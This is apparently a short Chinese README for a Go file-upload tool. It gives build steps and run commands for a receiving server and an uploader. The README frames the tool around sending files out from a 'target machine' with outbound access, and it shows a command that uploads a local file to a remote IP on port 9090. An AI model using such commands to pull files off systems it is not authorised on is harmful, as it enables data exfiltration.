# upload

在目标机器可以出网的情况下可以通过exe上传目标文件到服务器。

## 使用教程

### 编译:

```cmd
go build -o server.exe load.go

go build -o upload.exe upload.go
```

当然如果服务器是linux也可以编译成二进制文件

```cmd
set GOOS=linux

set GOARCH=amd64
```

### 运行

server是服务端用来接收文件的

```
server.exe -p 9090
```

upload是用来上传文件的

```
upload.exe -u C:\Users\Desktop\1.txt -i 192.168.1.100 -p 9090
```

